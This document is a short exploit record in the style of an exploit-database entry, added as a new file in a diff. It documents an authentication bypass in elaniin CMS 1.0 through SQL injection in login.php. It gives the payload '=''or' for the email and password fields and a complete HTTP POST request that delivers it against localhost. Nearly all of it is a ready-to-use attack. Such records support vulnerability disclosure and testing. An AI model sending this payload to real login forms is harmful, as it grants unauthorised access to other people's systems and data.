@@ -1,0 +1,29 @@
+# Exploit Title: elaniin CMS 1.0 - Authentication Bypass
+# Google Dork: N/A
+# Date: 2020-07-14
+# Exploit Author: BKpatron
+# Vendor Homepage:https://elaniin.com/
+# Software Link:https://github.com/elaniin/CMS/archive/master.zip
+# Version: v1.0
+# Tested on: Win 10
+# CVE: N/A
+
+# Vulnerability: Attacker can bypass login page and access to dashboard page
+# vulnerable file : login.php
+# Parameter & Payload: '=''or'
+# Proof of Concept:
+http://localhost/elaniin/login.php
+
+POST /elaniin/login.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data;
+Content-Length: 334
+Referer:http://localhost/elaniin/login.php
+Cookie: PHPSESSID=33snzxs8qht0gvh0fpd27vg62
+Connection: close
+Upgrade-Insecure-Requests: 1
+email=%27%3D%27%27or%27&password=%27%3D%27%27or%27&submit=LOGIN
